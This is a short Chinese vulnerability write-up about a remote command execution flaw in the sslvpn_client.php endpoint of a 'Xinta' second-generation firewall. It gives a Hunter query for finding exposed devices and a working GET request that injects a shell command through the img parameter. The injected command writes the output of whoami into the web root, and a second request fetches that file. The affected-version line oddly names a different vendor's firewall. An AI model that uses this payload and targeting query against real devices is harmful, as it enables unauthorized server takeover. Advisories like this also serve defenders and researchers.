# 鑫塔第二代防火墙sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
鑫塔第二代防火墙sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 博达下一代防火墙

# 三、资产测绘
+ hunter`web.body="欢迎登录鑫塔第二代防火墙"`
+ 特征

![1701763927338-de770e3a-3043-4409-ab92-51fd20c0c231.png](./img/a95HTPaLIvNmPZAV/1701763927338-de770e3a-3043-4409-ab92-51fd20c0c231-964403.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e.png](./img/a95HTPaLIvNmPZAV/1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e-966135.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762342384-224cbced-19ed-428d-b26d-9957865251d2.png](./img/a95HTPaLIvNmPZAV/1701762342384-224cbced-19ed-428d-b26d-9957865251d2-569179.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/du84v1279q9b4hgp>